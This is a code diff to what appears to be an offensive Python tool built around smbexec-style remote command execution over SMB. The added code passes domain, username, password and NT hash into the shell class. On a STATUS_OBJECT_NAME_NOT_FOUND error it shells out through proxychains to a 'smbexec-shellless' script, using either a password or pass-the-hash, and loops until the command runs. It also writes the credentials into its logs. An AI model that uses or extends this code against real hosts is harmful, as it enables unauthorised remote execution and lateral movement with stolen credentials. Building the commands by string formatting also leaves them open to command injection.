@@ -164,7 +164,7 @@ class CMDEXEC:
 
         self.shell = None
         try:
-            self.shell = SMBEXECShell(self.__share, rpctransport, self.__serviceName, self.__shell_type, self.__command2run, remoteName)
+            self.shell = SMBEXECShell(self.__share, rpctransport, self.__serviceName, self.__shell_type, self.__command2run, remoteName, self.__domain, self.__username, self.__password, self.__nthash)
         except  (Exception, KeyboardInterrupt) as e:
             if logging.getLogger().level == logging.DEBUG:
                 import traceback
@@ -177,7 +177,7 @@ class CMDEXEC:
 
 
 class SMBEXECShell():
-    def __init__(self, share, rpc, serviceName, shell_type, command2run, addr):
+    def __init__(self, share, rpc, serviceName, shell_type, command2run, addr, domain, username, password, nthash):
 
         self.__share = share
         self.__output = '\\\\%COMPUTERNAME%\\' + self.__share + '\\' + OUTPUT_FILENAME
@@ -221,6 +221,37 @@ class SMBEXECShell():
         except BaseException as e:
             if str(e).lower().find('dce') != -1:
                 printnlog('DCE RPC Error')
+            elif str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:
+                if logging.getLogger().level == logging.DEBUG:
+                    printnlog('{} Status object error happened switching to smbexec-shellless loophole'.format(addr))
+                else:
+                    lognoprint('{} Status object error happened switching to smbexec-shellless loophole'.format(addr))
+                # run the command
+                if password != '' and nthash == '': # if we are using a password to authenticate
+                    if logging.getLogger().level == logging.DEBUG:  # if were debugging print the output of smbexec-shellless
+                        printnlog('proxychains python3 {}/smbexec-shellless.py {}/{}:\'{}\'@{}  \'{}\''.format(cwd, domain, username, password, addr, command2run))
+                    else:  # otherwise just log it to the outputfile
+                        lognoprint('proxychains python3 {}/smbexec-shellless.py {}/{}:\'{}\'@{}  \'{}\''.format(cwd, domain, username, password, addr, command2run))
+                    data_out = subprocess.getoutput('proxychains python3 {}/smbexec-shellless.py {}/{}:\'{}\'@{}  \'{}\''.format(cwd, domain, username, password, addr, command2run))
+    
+                    while data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:  # this should work if we get a statys_object_name_not_found error to just rerun smbexec until it works
+                        data_out = subprocess.getoutput('proxychains python3 {}/smbexec-shellless.py {}/{}:\'{}\'@{}  \'{}\''.format(cwd, domain, username, password, addr, command2run))
+                else:# if we are using a nthash to authenticate
+                    
+                    if logging.getLogger().level == logging.DEBUG:  
+                        printnlog('proxychains python3 {}/smbexec-shellless.py {}/{}@{} -hashes \'{}\' \'{}\''.format(cwd, domain, username, addr, nthash, command2run))
+                    else:  # otherwise just log it to the outputfile
+                        lognoprint('proxychains python3 {}/smbexec-shellless.py {}/{}@{} -hashes \'{}\' \'{}\''.format(cwd, domain, username, addr, nthash, command2run))
+                        
+                    data_out = subprocess.getoutput('proxychains python3 {}/smbexec-shellless.py {}/{}@{} -hashes \'{}\' \'{}\''.format(cwd, domain, username, addr, nthash, command2run))
+
+                    while data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:  # this should work if we get a statys_object_name_not_found error to just rerun smbexec until it works
+                        data_out = subprocess.getoutput('proxychains python3 {}/smbexec-shellless.py {}/{}@{} -hashes \'{}\' \'{}\''.format(cwd, domain, username, addr, nthash, command2run))
+
+                if logging.getLogger().level == logging.DEBUG:  # if were debugging print the output of smbexec-shellless
+                    printnlog(data_out)
+                else:  # otherwise just log it to the outputfile
+                    lognoprint(data_out)
             else:
                 printnlog('Error in here: {}'.format(str(e)))
 
